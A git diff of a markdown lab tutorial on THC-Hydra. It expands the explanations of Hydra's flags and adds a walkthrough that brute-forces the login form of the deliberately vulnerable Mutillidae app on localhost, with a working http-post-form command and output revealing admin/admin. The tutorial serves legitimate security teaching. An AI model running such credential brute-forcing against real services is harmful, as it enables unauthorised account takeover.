@@ -12,7 +12,7 @@
   - [Using THC-Hydra](#using-thc-hydra)
   - [Attacking FTP service with THC-Hydra](#attacking-ftp-service-with-thc-hydra)
   - [Attacking SSH service with THC-Hydra](#attacking-ssh-service-with-thc-hydra)
-  - [Attacking Web application with THC-Hydra](#attacking-web-application-with-thc-hydra)
+  - [Attacking a Web application with THC-Hydra](#attacking-a-web-application-with-thc-hydra)
 
 ## Introduction
 
@@ -296,7 +296,7 @@ In this case, we are going to launch a dictionary attack against the SSH service
 
 Note: this will only work if the SSH service accepts password-based authentication.
 
-### Attacking Web application with THC-Hydra
+### Attacking a Web application with THC-Hydra
 
 In order to do this, we will use a vulnerable web application called [DVWA](https://github.com/digininja/DVWA). You'll find more information about how to install [DVWA](../appsecurity/dvwa.md) in this section.
 
@@ -324,17 +324,17 @@ So in order to conduct this attack, we need to do:
 
 Some of the parameters are already known, but lets look at some others:
 
-`-I`: ignore an existing restore file
+`-I`: ignore an existing restore file - basically it always starts over.
 
-`-e ns`: try "n" null password, "s" login as pass and/or "r" reversed login
+`-e ns`: try "n" null password, "s" login as pass and/or "r" reversed login. In this case, we are going to test for null passwords and also use the username as password as well.
 
-`-F`: exit when a login/pass pair is found
+`-F`: exit when a login/pass pair is found. This will immediately stop the search for more passwords, when one is found. This is not a good idea if you are planning on trying to identify/find all the possible passwords.
 
 `-u`: loop around users, not passwords
 
-`-t 1`: run TASKS number of connects in parallel per target
+`-t 1`: run TASKS number of connects in parallel per target. In this case we are just using a single task.
 
-`-w 10`: wait time for a response
+`-w 10`: wait time for a response. This indicates that THC-Hydra will wait for 10 seconds before giving a timeout.
 
 After this we should look at the output of the THC-Hydra tool:
 
@@ -350,3 +350,43 @@ After this we should look at the output of the THC-Hydra tool:
     1 of 1 target successfully completed, 1 valid password found
     Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-07 01:28:28
 
+Now we are going to try with a different web application. Metasploitable 2 also packs another vulnerable web application called [Mutillidae](https://github.com/webpwnized/mutillidae).
+
+This Mutillidae is also a vulnerable web application that was developed in PHP that might also be used for demonstration of multiple web application security problems. However, in this case, we might use it also for demonstrating attacks against passwords.
+
+After having Mutillidae up and running, we may try to attack it using also THC-Hydra. Again, and similarly to what happened before, we need to study our target before launching the proper attack. So lets look at the URL we want to target and that contains the authentication form:
+
+    http://127.0.0.1/index.php?page=login.php
+
+So, this page has a form that expects a set of parameters to be send through the POST method. These values are:
+
+`username`: this is the name of the user
+
+`password`: this is the password of the user
+
+`Login`: a variable called `login-php-submit-button` that always contains the value "Login"
+
+We also need to understand what fails in the case of a bad authentication. In this case we notice that the application presents the message "**Password Incorrect**". This is important for THC-Hydra to distinguish a successful from unsuccessful login attempts.
+
+So in order to conduct this attack, we need to do:
+
+    hydra -L users.txt -P passwords.txt -I -e ns -F -u -t 1 -w 10 -v -V 127.0.0.1 http-post-form "/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Password Incorrect"
+
+The parameters are the same that were used before. The results are:
+
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-07 17:52:25
+    [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+    [DATA] max 1 task per 1 server, overall 1 task, 252 login tries (l:18/p:14), ~252 tries per task
+    [DATA] attacking http-post-form://127.0.0.1:80/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Password Incorrect
+    [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+    [ATTEMPT] target 127.0.0.1 - login "root" - pass "root" - 1 of 252 [child 0] (0/0)
+    [ATTEMPT] target 127.0.0.1 - login "admin" - pass "admin" - 2 of 252 [child 0] (0/0)
+    [VERBOSE] Page redirected to http[s]://127.0.0.1:80/index.php?popUpNotificationCode=AU1
+    [80][http-post-form] host: 127.0.0.1   login: admin   password: admin
+    [STATUS] attack finished for 127.0.0.1 (valid pair found)
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-07 17:52:26
+
+Next we will try to use THC-Hydra to attack a well-known CMS system, that is used too host multiple web sites - Wordpress.
